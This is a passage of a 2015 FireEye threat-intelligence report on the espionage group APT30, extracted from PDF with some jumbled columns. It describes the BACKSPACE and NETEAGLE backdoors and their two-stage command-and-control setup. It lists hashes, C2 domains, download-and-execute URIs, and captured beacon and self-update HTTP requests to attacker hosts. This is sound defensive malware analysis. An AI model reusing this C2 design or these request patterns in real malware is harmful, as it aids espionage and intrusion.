{
    "id": "98edfee7-5fa7-4f1e-8d1c-1216be0d6512",
    "created_at": "2022-10-25T16:48:16.599503Z",
    "updated_at": "2025-03-27T02:16:43.630679Z",
    "deleted_at": null,
    "sha1_hash": "55ea4075414a961a79bf62c7c55008322dc8ee4e",
    "title": "",
    "authors": "",
    "file_creation_date": "2015-04-15T12:16:30Z",
    "file_modification_date": "2015-04-15T12:16:44Z",
    "file_size": 9506294,
    "plain_text": "S P E C I A L R E P O R T\n\nF I R E E Y E L A B S / F I R E E Y E T H R E A T I N T E L L I G E N C E\n##### APT30 AND THE MECHANICS\n###### OF A LONG-RUNNING CYBER ESPIONAGE OPERATION\n\n How a Cyber Threat Group Exploited Governments and Commercial Entities across Southeast Asia and India for over a Decade\n\nAPRIL 2015\n\n# SECURITY\n\n\n-----\n\nAPRIL 2015\n\n**Introduction** **3**\n**Key Findings** **4**\n**APT30: In It for the Long Haul** **5**\n**Professionally Developing Tools: APT30 Uses a Consistently Organized Malware Development Approach** **7**\n**Using Two-Stage C2 to Balance Stealth and Scalability** **9**\n**APT30’s Full-Featured Backdoor Control System Suggests Target Prioritization and Shift Work** **11**\nEstablishing Remote Control 12\nBACKSPACE Controller-Backdoor Communication 14\nTarget Host Prioritization and Alerts 14\nExecuting Custom Tasks 15\nVersion Control and Automatic Updates 15\nDisk Serial Number Authentication 16\nAPT30 Possibly Working in Shifts 16\n**APT30’s Primary Mission: Data Theft for Political Gain** **17**\n**APT30’s Targets Align with Chinese Government Interests and Focus on Southeast Asia** **19**\n**APT30 Pursues Members of the Association of Southeast Asian Nations (ASEAN)** **20**\nASEAN-themed Infrastructure and Customized Tools 21\nCustomized Malware Deployed around ASEAN Summits in January and April 2013 22\n**Social Engineering Consistently Includes Regional Security and Political Themes** **25**\nAPT30 Leverages Major Political Transition as Phishing Lure Content in Campaign Geared\nto Key Political Stakeholders 23\nRepeated Decoy Subjects on India-China Military Relations and Contested Regions 23\n**APT30’s Targeting of Journalists and Public Relations Topics** **26**\n**Conclusion** **28**\n**Appendix A - Detailed Malware Analysis** **29**\nBackdoors 29\nBACKSPACE Backdoor – “ZJ” Variant 30\nBACKSPACE Backdoor – “ZR” Variant 36\nNETEAGLE Backdoor – “Scout” Variant 47\nNETEAGLE Backdoor – “Norton” Variant 50\nMalware Targeting Removable Drives 51\nSHIPSHAPE 51\nSPACESHIP 53\nFLASHFLOOD 55\n**Miscellaneous Tools** **57**\n**MILKMAID / ORANGEADE Droppers and CREAMSICLE Downloader** **57**\n**BACKBEND and GEMCUTTER Downloaders** **58**\n**Appendix B – MD5 HASHES** **60**\n**Appendix C – ENDNOTES** **67**\n\n\n-----\n\n###### APT30 is noted for sustained activity, but also for successfully maintaining the same tools, tactics, and infrastructure since at least\n\n\n**hen** **our** **singapore-based** **fireeye** **labs** **team** **examined**\nmalware aimed predominantly at entities in\nSoutheast Asia and India, we suspected that\nwe were peering into a regionally focused\ncyber espionage operation. The malware\nrevealed a decade-long operation focused on\ntargets—government and commercial—who\nhold key political, economic, and military\ninformation about the region. This group, who\nwe call APT30, stands out not only for their\nsustained activity and regional focus, but also\nfor their continued success despite maintaining\nrelatively consistent tools, tactics, and\ninfrastructure since at least 2005.\n\nIn essence, our analysis of APT30 illuminates\nhow a group can persistently compromise\nentities across an entire region and subcontinent,\nunabated, with little to no need to significantly\nchange their modus operandi. Based on our\nmalware research, we are able to assess how\nthe team behind APT30 works: they prioritize\ntheir targets, most likely work in shifts in a\ncollaborative environment, and build malware\nfrom a coherent development plan. Their missions\nfocus on acquiring sensitive data from a variety\n\n\nof targets, which possibly include classified\ngovernment networks and other networks\ninaccessible from a standard Internet connection.\nWhile APT30 is certainly not the only group to\nbuild functionality to infect air-gapped networks\ninto their operations, they appear to have made\nthis a consideration at the very beginning of their\ndevelopment efforts in 2005, significantly earlier\nthan many other advanced groups we track.\n\nSuch a sustained, planned development effort,\ncoupled with the group’s regional targets and\nmission, lead us to believe that this activity is\nstate sponsored—most likely by the Chinese\ngovernment. Rather than focus on the potential\nsponsorship of this activity, this report seeks to\nthoroughly analyze the development effort of one\nof the longest-running advanced threat groups\nwe’ve observed.\n\n\n-----\n\nAPT30’s development\nand refinement of a\nset of integrated tools,\nas well as their re-use\nof infrastructure over\na period of 10 years,\nsuggests a consistent\n**long-term mission.**\nThis suite of tools\nincludes downloaders,\nbackdoors, a central\ncontroller, and several\ncomponents designed to\ninfect removable drives\nand cross air-gapped\nnetworks to steal data.\nAPT30 frequently\nregisters their own\nDNS domains for use\nwith malware command\nand control (C2). Based\non their presence in\nmalware samples, some\nof the domains have been\nin use for many years.\n\n\nAPT30 has a structured\nand organized\nworkflow, illustrative\nof a collaborative team\n**environment, and their**\nmalware reflects a\n**coherent development**\n**approach. The group (or**\nthe developers supporting\nthem) systematically\nlabels and keeps track of\ntheir malware versioning.\nThe malware uses\nmutexes and events to\nensure only a single copy\nis running at any given\ntime, and the malware\nversion information is\nembedded within the\nbinary. Malware C2\ncommunications include a\nversion check that allows\nthe malware to update\nitself to the latest copy,\nproviding a continuous\nupdate management\ncapability.\n\n\nThe controller software\nfor APT30’s BACKSPACe\nbackdoor (also known\nas “Lecna”) suggests the\nthreat actors prioritize\n**targets and may work on**\n**shifts. APT30 backdoors**\ncommonly use a twostage C2 process, where\nvictim hosts contact\nan initial C2 server to\ndetermine whether they\nshould connect to the\nattackers’ main controller.\nThe controller itself\nuses a GUI that allows\noperators to prioritize\nhosts, add notes to\nvictims, and set alerts\nfor when certain hosts\ncome online. Finally, an\nunused dialog box in the\ncontroller provides a login\nprompt for the current\n“attendant.”\n\n\nThe group’s primary goal\nappears to be sensitive\n**information theft for**\n**government espionage.**\nAPT30 malware\nincludes the ability to\nsteal information (such\nas specific file types),\nincluding, in some cases,\nthe ability to infect\nremovable drives with the\npotential to jump air gaps.\nSome malware includes\ncommands to allow it to\nbe placed in “hide” mode\nand to remain stealthy\non the victim host,\npresumably for long-term\npersistence.\n\n\nAPT30 predominantly\ntargets entities\nthat may satisfy\n**governmental**\n**intelligence collection**\n**requirements. The**\nvast majority of\nAPT30’s victims are\nin Southeast Asia.\nMuch of their social\nengineering efforts\nsuggest the group is\nparticularly interested\nin regional political,\nmilitary, and economic\nissues, disputed\nterritories, and\nmedia organizations\nand journalists who\nreport on topics\npertaining to China\nand the government’s\nlegitimacy.\n\n\n-----\n\n###### APT30: In It for the Long Haul\n\nDOMAIN DOMAIN REGISTRATION DATE\n\n\nCOMPILE DATE–EARLY SAMPLE COMPILE DATE–RECENT SAMPLE\n\n\n###### 11 March 2005\n\n 4 September 2007\n\n\n###### 11 May 2014\n\n 11 May 2014\n\n```\nkm-nyc.com\nkm153.com\n\n```\n\n###### 11 March 2004\n\n 30 August 2007\n\n\nur analysis of APT30’s malware and\ndomain registration data shows the group\nhas been operating for over a decade. The\n\n### O\n\nearliest-known registration dates for domains\nattributed to APT30 go back to 2004, and the\ncompile times for APT30 malware using those\ndomains for C2 date back to 2005.[1]\n\nTypically, threat groups who register domains for\nmalicious use will abandon them after a few years.\nAPT30, however, has used some of their domains\nfor more than five years, with some of their\nearliest domains still in use as of at least late 2014.\n\nFor example, one of the earliest known\nBACKSPACE malware samples (md5 hash\n```\nb2138a57f723326eda5a26d2dec56851)\n\n```\nwas compiled onMarch 11, 2005 at 00:44:47.\nThe sample used the domain www.km-nyc[.]\n```\ncom as its primary C2 location. That domain\n\n```\nwas still in use as a secondary C2 domain in\na BACKSPACE sample compiled as recently\nas November 5, 2014 05:57:26 (md5 hash\n```\n38a61bbc26af6492fc1957ac9b05e435).\n\n```\n\nFor such a long operational history, APT30\nappears to have conducted their activity using\na surprisingly limited number of tools and\nbackdoors. One reason for this might be that\nthey have had no need to diversify or add to their\narsenal if they have been successful with their\ncurrent approach. Although APT30 has used a\nvariety of secondary or supporting tools over the\nyears (such as droppers and downloaders used to\ndeploy APT30’s primary backdoors), their primary\ntools have remained remarkably consistent over\ntime: namely, the backdoors BACKSPACE and\nNETEAGLE, and a set of tools (SHIPSHAPE,\nSPACESHIP, and FLASHFLOOD) believed to be\ndesigned to infect (and steal data from) air-gapped\nnetworks via infected removable drives.\n\nWhere some threat groups might exchange one\nbackdoor for another as newer, more flexible,\nor more feature-rich tools become available,\n**APT30 has chosen to invest in the long-term**\n**refinement and development of what appear**\n**to be a dedicated set of tools. This suggests**\n**that APT30 (or the developers providing them**\n**with tools) has the ability to modify and adapt**\n**their source code to suit their current needs or**\n**their target environment. The earliest variants of**\nthe BACKSPACE backdoor date to at least 2005,\nand versions of the backdoor remain in use today.\nBACKSPACE itself appears to have a flexible,\nmodularized development framework and has\nbeen modified over time to create a wide range of\nvariants.\n\n\n-----\n\n###### APT30 appears to have a consistent, long-term mission that relies on existing tools to remain sufficient over time.\n\n\nFireEye has identified two main “branches”\nof the BACKSPACE code (“ZJ” and “ZR”),\neach compiled with a slightly different set of\ncommands. In addition, while BACKSPACE has\nbeen implemented in a variety of ways (e.g., as a\nstandalone EXE, as a DLL, as an EXE that extracts\nand launches a DLL at runtime) and leveraged a\nvariety of persistence methods (e.g., via a shortcut\n(.lnk) file in the Startup folder, as a service\nDLL), the core functionality has remained largely\nunchanged, although some additional features\nhave been added over time.\n\nWhile the NETEAGLE backdoor does not have\nas venerable a history (identified samples were\ncompiled as early as 2008 and as recently as\n2013), it shows a similar pattern of long-term\nrefinement and modification, including the\ndevelopment of two main variants (which we call\n\n\nthe “Scout” and “Norton” variants). Just as with\nBACKSPACE, while the details of implementation\nand specific features across NETEAGLE samples\nmay vary, the core functionality remains the\nsame except for the addition of features or\nenhancements.\n\n**This dedication to adapting and modifying**\n**tools over a number of years, as opposed to**\n**discarding old tools in favor of newer, readily**\n**available ones, implies that APT30 has a**\n**long-term mission, and that their mission is**\n**consistent enough for their existing tools to be**\n**sufficient to support their operations over a**\n**long period of time.**\n\n\nMALWARE / TOOL COMPILE DATE–EARLY SAMPLE COMPILE DATE–RECENT SAMPLE\n\nBACKSPACE 2 January 2005 5 November 2014\n\nNETEAGLE 20 June 2008 6 November 2013\n\nSHIPSHAPE 22 August 2006 9 June 2014\n\nSPACESHIP 23 August 2006 5 June 2014\n\nFLASHFLOOD 31 January 2005 17 February 2009\n\n\n-----\n\n###### PROFESSIONALLY DEVELOPING TOOLS: APT30 Uses a Consistently Organized\n Malware Development Approach\n\n**Table 1: ZRLnk version history**\n\n\nn addition to APT30’s long-term use of a\nregular set of tools, in most cases the tools\nthemselves – while they may vary in purpose –\n\n### I\n\nshare a consistent set of development features. In\nparticular, the tools all exhibit a carefully managed\nversioning system and a consistent method for\nchecking version information, performing updates,\nand ensuring only a single copy of a given tool is\nrunning on a victim host at any time. This suggests\n**that APT30 is dedicated to maintaining a tightly**\n**run, efficient operation.**\n\nBACKSPACE, NETEAGLE, SHIPSHAPE, and\nSPACESHIP all maintain an internal version\nnumber and include some means to check their\nversion number against a reference version, and\nattempt to automatically update the malware if\nits version is different than the reference number.\nFor some APT30 malware, we speculate that\nthe version string may also describe additional\nproperties of the malware. For instance, one\nvariant of BACKSPACE (“ZRLnk”) uses a version\nstring where the first two digits indicate the\nmalware version number. The next character\nmay indicate the type of icon stored in the file’s\nresource section and possibly the type of exploit\ndocument used to deliver the malware (for\nexample, ‘p’ for Acrobat Reader / PDF and ‘w’ for\nMicrosoft Word[ 2]). Finally, the next character (‘l’)\nmay indicate that that the malware uses a shortcut\n(.lnk) file to maintain persistence. [3]\n\n\n**MD5 Hash** **Version** **Compile Time** **Size**\n\nb4ae0004094b37a40978ef06f311a75e 1.0.p.l 4 November 2010 03:51 73,728\n\n37aee58655f5859e60ece6b249107b87 1.1.w.l 25 February 2011 02:03 32,768\n\n8ff473bedbcc77df2c49a91167b1abeb 1.2.w.l 4 May 2011 14:46 49,152\n\n4154548e1f8e9e7eb39d48a4cd75bcd1 1.2.w.l 4 May 2011 14:46 17,408\n\n15304d20221a26a0e413fba4c5729645 1.2.w.l 16 May 2011 11:03 36,864\n\nc4dec6d69d8035d481e4f2c86f580e81 1.3.w.l 26 October 2011 11:21 40,960\n\na813eba27b2166620bd75029cc1f04b0 1.3.p.l 28 June 2012 10:01 86,144\n\n5b2b07a86c6982789d1d85a78ebd6c54 1.5.w.lN 8 January 2013 01:33 10,518,528\n\n71f25831681c19ea17b2f2a84a41bbfb 1.6.w.lY 23 April 2013 08:12 57,344\n\n6ee35da59f92f71e757d4d5b964ecf00 1 9 w lY 28 August 2014 0 9:12 57 344\n\n|Version|Compile Time|\n|---|---|\n|1.0.p.l|4 November 2010 03:51|\n|1.1.w.l|25 February 2011 02:03|\n|1.2.w.l|4 May 2011 14:46|\n|1.2.w.l|4 May 2011 14:46|\n|1.2.w.l|16 May 2011 11:03|\n|1.3.w.l|26 October 2011 11:21|\n|1.3.p.l|28 June 2012 10:01|\n|1.5.w.lN|8 January 2013 01:33|\n|1.6.w.lY|23 April 2013 08:12|\n\n\n-----\n\n###### APT30 likely either develops their own tools or has a working relationship with developers who are able to consistently - perhaps exclusively - support them.\n\n\nWith respect to version numbers, the BACKSPACE “ZJ”\nvariant has the longest revision history. Our analysis of\n55 ZJ samples showed versions from 1.2 through 20.50\nspanning nearly eight years (from 2005 through 2012,\nbased on compile times).\n\nBesides version control, most malware used by APT30\n(to include BACKSPACE, SHIPSHAPE, SPACESHIP, and\nFLASHFLOOD) uses a consistent methodology (a set of\nmutexes and events) to manage malware execution and\nensure that only a single copy of a given piece of malware\nis running at any one time, presumably to decrease\nthe chances of detection. The mutexes and events are\nhighly consistent in their naming conventions, with most\ncontaining the terms ‘Microsoft’ or ‘ZJ’ or both. The mutex\nis created when the malware executes, and ensures only\none copy is running at a time. The events use similar naming\nconventions as the mutexes, and are used to signal the\nmalware and associated threads to exit.[4]\n\nThe emphasis on malware versioning implies a structured\nand well-managed development environment. Similarly,\n\n\nthe close attention to ensuring only one copy of a given\ntool is running at a time and a well-developed, automated\nmeans of update management imply that these tools are in\nuse by a professional team of threat actors. We can infer\n**that the threat actors are interested in maintaining the**\n**latest and greatest versions of their tools in their victims’**\n**environments. Likewise, the threat actors are likely**\n**operating at a sufficiently large scale that they benefit**\n**from the automated management of many of their tools.**\n\nWhile there is no guarantee that the tools described in this\npaper are exclusive to APT30, we have not yet observed\nthese tools used by any other threat groups. That the tools\n###### have evolved over time while maintaining a consistent amount of core functionality indicates that APT30 has development resources available to modify and customize their malware. This implies either that APT30 is responsible for developing their own tools, or has a working relationship with developers able to support them in a consistent (and possibly exclusive) manner.\n\n\n**Table 2: Mutexes and events used for process execution and version control**\n\n**Malware** **Example Mutexes / Events**\n\nBACKSPACE MicrosoftZj\nMicrosoftExit\nMicrosoftHaveAck\nMicrosoftHaveExit\n\nBACKSPACE MicrosoftZjLnk\nMicrosoftExitLnk\nMicrosoftHaveLnkAck\nMicrosofthaveLnkExit\n\nSHIPSHAPE MicrosoftShipZJ\nMicrosoftShipExit\nMicrosoftShipHaveAck\nMicrosoftShipHaveExit\n\nSPACESHIP\nMicrosoftShipTrZJ\nMicrosoftShipTrExit\nMicrosoftShipTrHaveExit\n\nFLASHFLOOD MicrosoftFlashZJ\nMicrosoftFlashExit\nMicrosoftFlashHaveAck\nMicrosoftFlashHaveExit\n\n|Malware|Example Mutexes / Events|\n|---|---|\n|BACKSPACE|MicrosoftZj MicrosoftExit MicrosoftHaveAck MicrosoftHaveExit|\n|BACKSPACE|MicrosoftZjLnk MicrosoftExitLnk MicrosoftHaveLnkAck MicrosofthaveLnkExit|\n|SHIPSHAPE|MicrosoftShipZJ MicrosoftShipExit MicrosoftShipHaveAck MicrosoftShipHaveExit|\n|SPACESHIP|MicrosoftShipTrZJ MicrosoftShipTrExit MicrosoftShipTrHaveExit|\n\n\n-----\n\n###### USING TWO-STAGE C2 to Balance Stealth and Scalability\n\nhe BACKSPACE and NETEAGLE\nbackdoors used by APT30 use a two-stage\nC2 infrastructure. The backdoors are\n\n### T\n\nconfigured with an initial (stage one) set of C2\nlocations, typically one or more C2 domains.\nInteraction with the stage one C2 is fully\nautomated; that is, the stage one C2 does not\nsupport any interactive communication between\nthe threat actor and the victim computer. Both\nBACKSPACE and NETEAGLE use HTTP requests\nto interact with the stage one C2, requesting\nURIs to download different files that are used to\nobtain basic instructions, information (including\nsecond stage C2 locations) or download and\nexecute additional binaries. While victim hosts\nmay beacon to the second stage C2 (e.g., transmit of\ndata about the victim without expectation of a\nresponse), only those victim hosts specifically\ninstructed to do so will establish a full connection\nto a BACKSPACE controller. Once the malware\nhas connected to the controller, the threat actor\ncan interact directly with the victim host.\n\n**Table 3: Example URIs used for BACKSPACE first-stage C2**\n\n**URI (<path>/<file>)** **Function**\n\n`/ForZRLnk3z/hostlist.txt` Validation check and list of victims to perform further actions.\n\n`/some/edih.txt` Switch specified victims to “hide” mode.\n\n`/some/nur.txt` Switch specified victims to “run” mode.\n\nSwitch to backup stage one C2 server (BACKSPACE is typically configured with main and backup\n```\n /ForZRLnk3z/bak.txt\n```\nfirst-stage C2 servers).\n\n`/ForZRLnk3z/app.txt` Download and execute the file.\n\n`/ForZRLnk3z/myapp.txt` Download and execute the file (if victim appears in hostlist.txt).\n\n`/ForZRLnk3z/ver.txt` Perform version check.\n\n`/ForZRLnk3z/exe.txt` Download and execute the file if the version check fails (self-update).\n\n`/ForZRLnk3z/SomeUpVer.txt` Backup URI for version check.\n\n`/ForZRLnk3z/SomeUpList.txt` List of hostnames that should perform self-update if backup version check fails.\n\n`/ForZRLnk3z/SomeUpExe.txt` Backup URI for self-update.\n\n`/ForZRLnk3z/dizhi.gif` Second-stage C2 information (IP address and port(s)).\n\n`/ForZRLnk3z/connect.gif` List of victims to connect to second-stage C2 controller.\n\n|URI (<path>/<file>)|Function|\n|---|---|\n|/ForZRLnk3z/hostlist.txt|Validation check and list of victims to perform further actions.|\n|/some/edih.txt|Switch specified victims to “hide” mode.|\n|/some/nur.txt|Switch specified victims to “run” mode.|\n|/ForZRLnk3z/bak.txt|Switch to backup stage one C2 server (BACKSPACE is typically configured with main and backup first-stage C2 servers).|\n|/ForZRLnk3z/app.txt|Download and execute the file.|\n|/ForZRLnk3z/myapp.txt|Download and execute the file (if victim appears in hostlist.txt).|\n|/ForZRLnk3z/ver.txt|Perform version check.|\n|/ForZRLnk3z/exe.txt|Download and execute the file if the version check fails (self-update).|\n|/ForZRLnk3z/SomeUpVer.txt|Backup URI for version check.|\n|/ForZRLnk3z/SomeUpList.txt|List of hostnames that should perform self-update if backup version check fails.|\n|/ForZRLnk3z/SomeUpExe.txt|Backup URI for self-update.|\n|/ForZRLnk3z/dizhi.gif|Second-stage C2 information (IP address and port(s)).|\n\n\nhe BACKSPACE and NETEAGLE **By using this two-stage approach, the threat**\nbackdoors used by APT30 use a two-stage **actors introduce a layer of obfuscation**\nC2 infrastructure. The backdoors are **between themselves and their victims. This also**\n\n### T\n\nconfigured with an initial (stage one) set of C2 **allows them to better manage their victims,**\nlocations, typically one or more C2 domains. **particularly at scale; newly infected victims**\nInteraction with the stage one C2 is fully **can interact with the stage one C2 servers in**\nautomated; that is, the stage one C2 does not **an automated fashion until the threat actors**\nsupport any interactive communication between **can review them and select particular hosts for**\nthe threat actor and the victim computer. Both **interactive, stage two exploitation.**\nBACKSPACE and NETEAGLE use HTTP requests\nto interact with the stage one C2, requesting The table below shows an example set\nURIs to download different files that are used to of URIs that may be requested by the\nobtain basic instructions, information (including BACKSPACE sample with md5 hash\nsecond stage C2 locations) or download and `6ee35da59f92f71e757d4d5b964ecf00, and the`\nexecute additional binaries. While victim hosts purpose of each file.[5] Full URIs are in the format\nmay beacon to the second stage C2 (e.g., transmit of hxxp://<c2_domain>/<path>/<file>, where\ndata about the victim without expectation of a `<c2_domain> is one of the backdoor’s specified`\nresponse), only those victim hosts specifically C2 domains; <path> is a path name that typically\ninstructed to do so will establish a full connection varies across samples (/some/ or /ForZRLnk3z/\nto a BACKSPACE controller. Once the malware in the examples below); and <file> is the\nhas connected to the controller, the threat actor specific file requested.\ncan interact directly with the victim host.\n\n\n-----\n\n**Figure 1: A typical victim interaction with the stage one and stage two C2 servers**\n\n|Stage Two C2 Server (IP:port1:port2)|Stage One C2 Server|BACKSPACE Victim Host|\n|---|---|---|\n|1. APT30 threat actor uses the BACKS dizhi.gif and upload it to the Stage O IP:port1:port2 information for Stag port 1 port 2 dizh port 1 port 2 3. 4. APT30 threat actor uses the BACKS connect.gif and upload it to the Stag hostname and host ID of the victim port 1 port 2 conn port 1 port 2|PACE controller to generate 2 ne C2. The file contains e Two C2. i.gif dizh system in|. Victim host downloads dizhi.gif from the Stage One C2. i.gif formation . Victim host downloads connect.gif from the Stage One C2, compares the hostname and host ID. ect.gif|\n||Victim host transmits system information via HTTP POST beacon to IP:port1 (connection is instantly created). PACE controller to generate 5 e One C2. The file contains the computer. ect.gif conn||\n||6. Victim host establishes a separate TCP connecton to IP:port2 for remote control (connection is kept during the control).||\n\n\n-----\n\n###### APT30’S FULL-FEATURED\n BACKDOOR CONTROL SYSTEM Suggests Target Prioritization and Shift Work\n\n\ndditional information about APT30’s\noperations can be inferred by examining\nthe GUI controller used to manage their\n\n### A\n\nBACKSPACE backdoors. FireEye analyzed three\ncopies of the BACKSPACE controller software,\nknown as the “NetEagle Remote Control System”\n\n6 (according to the version information from one\nsample) or 网络神鹰远程控制系统 (according\nto the “About” dialog box). Although the copies\nwe analyzed were compiled in 2010, 2011, and\n2013 respectively, the tool’s descriptions indicate\nthe original controller software may have been\ndeveloped as early as 2004.[7]\n\nThe BACKSPACE controller is a well-developed,\nfull-featured GUI tool. The controller includes\nmain menu items for “System”, “Network”, “File”,\n“Remote”, and “Attack” operations, in addition to\nthe “About” dialog box. Information about victim\nhosts connected to the controller is displayed in\nthe lower panes, including the hostname, internal\nand external IP addresses, system uptime, and OS\nversion and language.\n\n\n**Figure 2: Version information from BACKSPACE controller**\n\n|Comments:|©2004 Microsoft Corporation. 保留所有权利。|\n|---|---|\n|CompanyName:|Flyeagle science and technology company|\n|FileDescription:|NetEagle Remote Control Software|\n|FileVersion:|4.2|\n|InternalName:|Neteagle|\n|LegalCopyright:|版权所有 © 2004－永久|\n|LegalTrademarks:||\n|OriginalFilename:|NETEAGLE.EXE|\n|PrivateBuild:||\n|ProductName:|NetEagle Remote Control Software|\n|ProductVersion:|4.2|\n|SpecialBuild:||\n\n\n**Figure 3: \"About\" dialog box from \"NetEagle\" BACKSPACE controller**\n###### Many of APT30’s tools perform version checks and attempt to self-update.\n\n\n-----\n\n**Local Info     Computer Name              IP                           Location                                Refresh Interval (min)    Online Capacity**\n\n**Hostname           Public IP            Private IP           Location             Up-Time     OS     Comment  Host ID   Domain Controller Name**\n\n**Domain**\n**Hostname           Public IP      Private IP     Location   Up-Time  OS/Language                                      Comment    Host ID Controller Name**\n\n**√**\n\n\n**Figure 5: BACKSPACE controller showing sample victim idle (top), and with remote control established (bottom)**\n\n\n###### ESTABLISHING REMOTE CONTROL\nCommunication with the stage two C2 server\n(e.g., the BACKSPACE controller) is managed\nvia two files hosted on the stage one C2 server,\n```\ndizhi.gif and connect.gif. BACKSPACE victim\n\n```\ncomputers will retrieve dizhi.gif and transmit\ninformation about the victim computer (via HTTP\nPOST) to the second stage IP address and port\nspecified in that file. This victim information is\nused to populate the controller GUI (see Figure\n4). However, BACKSPACE clients do not establish\ninteractive connections to the BACKSPACE\ncontroller by default, as this would increase the\n\n\nWhen a threat actor wants to establish\nremote control over a victim host, he uploads a\nnotification file (e.g., connect.gif) containing\nthe victim hostname and host ID number to the\nstage one C2 server. Victim hosts will parse the\n```\nconnect.gif file retrieved from the server and\n\n```\nconnect to the BACKSPACE controller (using the\ndata from dizhi.gif) if their hostname and host\nID are present in the file.\n\n\n-----\n\nBoth dizhi.gif and connect.gif are generated\nby the BACKSPACE controller based on userdefined configuration settings and automatically\nuploaded to the stage one C2 server. This\nsimplifies management of victim computers,\nreduces the risk of configuration errors, and\nallows even relatively unskilled operators to\nmanage C2 infrastructure and victim hosts.\n\nThe screen shot below shows the configuration\noptions for the two files, including the FTP\ncredentials used to connect to the stage one\nserver, the path for the files, the names of the\nfiles, and the primary and backup stage one C2\nservers. These same configuration settings are\nused to customize a copy of the BACKSPACE\nmalware, by “patching” the relevant bytes within\nthe BACKSPACE binary.\n\nSimilarly, a second dialogue box allows the threat\nactor to specify the ports (listed in dizhi.gif)\nused for communication with the second stage\nC2 server/BACKSPACE controller. The first port\nis used to transmit victim data via HTTP POST.\nThe second port is used to establish an interactive\nconnection with the BACKSPACE controller. The\nthird port is used for a reverse command shell\nbetween the controller and the victim.\n\n\nDouble-clicking an idle victim in the BACKSPACE\ncontroller GUI will automatically create (or\nupdate) connect.gif with that victim’s hostname\nand host ID and upload the new file to the stage\none C2 server. The next time the victim parses the\nfile, it will establish a connection to the controller.\n\n\n**Figure 7:**\nDialog box for configuring ports\nfor second stage C2\n\n\n**Figure 6:**\nConfiguration\noptions for dizhi.gif\nand connect.gif\n\n\n-----\n\n**Figure 8:**\nSample victim host data\nsent to BACKSPACE\ncontroller\n\n```\nPOST /index.htm HTTP/1.0\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Win32)\nHOST: 192.168.43.130:80\nPragma: no-c ache\nContent-Length: 235\nProxy-Connection: Keep-Alive\nUSER-29861D99F7.192.168.43.133.............(......Service Pack\n3.........................................................................\n.....................................................N..1.0.p.18:32.www.stonehoof.\ncom/ForZRMail..\n\n```\n\n###### BACKSPACE CONTROLLER – BACKDOOR COMMUNICATION\nThe BACKSPACE controller uses a modified\nHTTP protocol to communicate with BACKSPACE\nclients on victim hosts. Victim hosts send data to\nthe controller in HTTP POST format. When the\ncontroller receives the data, it ignores other HTTP\nheaders and only parses the Content-Length\nvalue and the body data. No acknowledgement\npacket is sent back to the backdoor.\n\nThe BACKSPACE controller sends remote\ncommand messages to BACKSPACE clients in\nthe format below, disguised as a response from a\nMicrosoft IIS 6.0 server. Similar to the controller,\nthe BACKSPACE client only parses the Content```\nLength field and the remote command stored in\n\n```\nthe body and ignores other HTTP headers.\n\n\n###### TARGET HOST PRIORITIZATION\n AND ALERTS\nThe BACKSPACE controller allows the threat\nactors to further manage their victim hosts\nby labeling individual hosts with a comment,\nassigning a priority level to the victim (“Normal”,\n“Important”, or “Very Important”), and setting an\nalert to notify the threat actor when the victim\nhost comes online.\n\n###### APT30 assigns a priority level to their victims: “Normal,” “Important,” and “Very Important.”\n\n\n**Figure 9:**\nSample remote command sent from controller\nto BACKSPACE backdoor\n```\nHTTP/1.1 200 OK\nServer: Microsoft-IIS6.0\nContent-Length: 12\nContent-Type: */*\nAccept-Ranges: bytes\nConnection: Keep-Alive\nB....C:\\*.*.\n\n```\n\n**Figure 10:**\nDialog box to set priority and other options on\na victim host\n\n\n-----\n\n###### EXECUTING CUSTOM TASKS\nThe BACKSPACE controller includes a menu\nitem called “Automatically Execute Custom Task”\n(highlighted below) which sends the ‘O’ command\nsupported by some variants of the BACKSPACE\nbackdoor.[8] When the backdoor receives this\ncommand, it uploads data to the controller from\npredefined paths on the victim host ($LDDATA$\\\nand %WINDIR%\\$NtUninstallKB900727$\\).\nThis special command appears to be used to\nretrieve stolen data from the victim computer\nin an automated fashion (as opposed to\nmanually uploading files or directories). Of\nnote is that these paths are found in other tools\nused by APT30 (specifically SPACESHIP and\nFLASHFLOOD) believed to be used to target airgapped computers and networks.[9]\n\nBelow the “Automatically Execute Custom\nTask” menu item is another custom option for\n“GOTO custom path”. When selected, that menu\nitem also directs the operator to a predefined\ncustom path (one used by some versions of\nFLASHFLOOD) by default:\n\n\n###### VERSION CONTROL AND AUTOMATIC UPDATES\nLike many of the tools used by APT30, the\nBACKSPACE controller also performs a version\ncheck and attempts to self-update. The controller\nwill transmit the following HTTP requests for\na version file (NetEagleVer.txt) and updated\nbinary (NetEagle.exe) when it starts.\n\n\n**Figure 13: BACKSPACE controller version check**\nand self-update\n```\nGET /NE.General NetEagleVer.txt HTTP/1.1\nAccept: */*\nUser-Agent: HttpClient\nHost: www.km153.com\nGET /NE.General/NetEagle.exe HTTP/1.1\nAccept: */*\nUser-Agent: HttpClient\nHost: www.km153.com\n\n```\n\n**Figure 12: BACKSPACE controller showing path used by other APT30 tools**\n\n\n-----\n\n**Figure 14:**\nEncoded disk serial\nnumbers in the\nBACKSPACE\ncontroller binary\n\n\n###### DISK SERIAL NUMBER AUTHENTICATION\nThe BACKSPACE controller also includes a\ncheck to ensure that the controller is only run on\nauthorized machines. The controller compares\nthe local host’s hard disk serial number with\n45 encoded serial numbers hardcoded within\nthe controller binary, and continues execution\nonly if there is a match. This indicates that the\ndevelopers of the controller wanted to limit its\ndistribution and use. The developers could have\nwritten the controller for themselves; alternately,\nthe controller could have been sold with built-in\nrestrictions so the developers could continue to\nwrite and sell custom versions to others.[10] Given\nthe tightly integrated nature of much of APT30’s\nmalware (with each other and with the controller)\nand the fact that the controllers themselves use\nAPT30 domains to perform self-update checks,\nit seems more likely that APT30 (or a group of\ndevelopers closely aligned with them) created the\ncontroller for their own use.\n\n###### APT30 POSSIBLY WORKING ON SHIFTS\nIn our analysis of the BACKSPACE controller, we\nidentified a dialog box in the portable executable\n(PE) resource section. The dialog box included a\nlogin prompt with the text请输入您的值班员代号,\nwhich translates to “Please enter your attendant\ncode”. This suggests the tool may have been\ndesigned to track work shifts amongst multiple\noperators, although this particular feature was\ndisabled in the sample we analyzed.\n\nThe history of the BACKSPACE controller\n(possibly written as early as 2004, and still\ncompatible with BACKSPACE variants\ncompiled within the past year) reflects a tool\ndeveloped over time and designed to facilitate\ndetailed interaction with victim hosts through a\nrelatively simple interface. The tool is capable\n**of supporting interaction with a large number**\n\n\n**Figure 15:**\nBACKSPACE controller “attendant” dialog box\n\n\n**of victim 